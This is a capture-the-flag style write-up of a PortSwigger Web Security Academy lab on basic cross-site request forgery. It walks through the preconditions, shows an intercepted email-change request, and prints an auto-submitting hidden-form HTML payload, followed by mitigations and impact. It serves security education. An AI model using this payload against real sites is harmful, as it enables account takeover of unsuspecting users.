# 🎯 CSRF Lab 1: Basic Cross-Site Request Forgery

> Category: Web Security / CSRF
> Difficulty: Easy

---

# 📌 Overview

This lab demonstrates a basic **Cross-Site Request Forgery (CSRF)** vulnerability where an attacker can trick an authenticated victim into changing their account email address without their consent.

The application lacks CSRF protections such as:

* CSRF tokens
* SameSite cookie protections
* Additional request validation

---

# 🎯 Objective

Perform a CSRF attack that changes the victim’s email address.

---

# 🧠 Understanding CSRF

A CSRF attack occurs when:

* A victim is authenticated to a target application
* The application relies on cookies for session management
* Sensitive actions can be triggered without verifying the request origin

An attacker can craft a malicious webpage that silently sends requests on behalf of the victim.

---

# ⚠️ Conditions Required for CSRF

## 1. Relevant Action ✅

The application contains a state-changing functionality:

```http
POST /my-account/change-email
```

This action updates the user’s email address.

---

## 2. Cookie-Based Session Handling ✅

The application uses session cookies for authentication:

```http
Cookie: session=MkQRGfxxsYF57LniREMGz9UKirXdjQX0
```

Since browsers automatically include cookies in requests, forged requests will be authenticated.

---

## 3. No Unpredictable Request Parameters ✅

The request only requires an email parameter:

```http
email=change%40changing.ch.org
```

There are:

* No CSRF tokens
* No password confirmation
* No one-time validation values

---

## 4. Victim Must Be Authenticated ✅

The victim needs to be logged into the application.

The lab provides valid credentials for authentication.

---

# 🔎 Enumeration

After logging into the application, the email update request was intercepted using Burp Suite.

## Intercepted Request

```http
POST /my-account/change-email HTTP/2
Host: 0a3200020380bcc0812c938e00020084.web-security-academy.net

Cookie: session=MkQRGfxxsYF57LniREMGz9UKirXdjQX0

Content-Type: application/x-www-form-urlencoded

email=change%40changing.ch.org
```

---

# 🔍 Vulnerability Analysis

| Requirement                 | Status | Evidence                          |
| --------------------------- | ------ | --------------------------------- |
| Relevant Action             | ✅      | Email change functionality exists |
| Cookie-Based Sessions       | ✅      | Uses session cookies              |
| No Unpredictable Parameters | ✅      | Only requires email parameter     |
| Victim Authentication       | ✅      | Victim must be logged in          |

Therefore, the application is vulnerable to CSRF attacks.

---

# ⚔️ Exploitation

## Step 1: Craft the Malicious HTML Payload

```html
<html>
  <body>
    <form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="change@changing.ch.org">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Step 2: Deliver the Payload

The malicious HTML page is delivered to the victim.

When the victim visits the page:

* The form automatically submits
* The browser includes the victim’s session cookie
* The application processes the request as legitimate

---

## 💥 Result

The victim’s email address is successfully changed to:

```text
change@changing.ch.org
```

The lab is solved once the email update succeeds.

---

# 🛡️ Mitigation

Applications should implement proper CSRF defenses, including:

* CSRF tokens
* SameSite cookie attributes
* Re-authentication for sensitive actions
* Origin and Referer validation

Example:

```http
Set-Cookie: session=abc123; SameSite=Lax
```

---

# 🚨 Potential Impact

If an attacker changes a victim’s email address to one they control, they may be able to:

* Trigger password reset functionality
* Receive password reset links
* Take over the victim’s account

This can ultimately lead to full account compromise.

---

# 🧠 Key Takeaways

* CSRF exploits trust between the browser and the application
* Cookie-based authentication is highly susceptible without CSRF protections
* Sensitive actions should always require anti-CSRF mechanisms
* Even simple functionality like email updates can lead to account takeover

---

# 🔗 Lab Source

[PortSwigger Web Security Academy - CSRF Lab](https://portswigger.net/web-security/csrf?utm_source=chatgpt.com)

---

# 💬 Offensive Security Relevance

This lab demonstrates a real-world web exploitation technique used during:

* Web application penetration testing
* Bug bounty hunting
* Red team engagements

Understanding CSRF helps offensive security professionals:

* Identify weak request validation
* Assess authentication mechanisms
* Evaluate session handling security

---

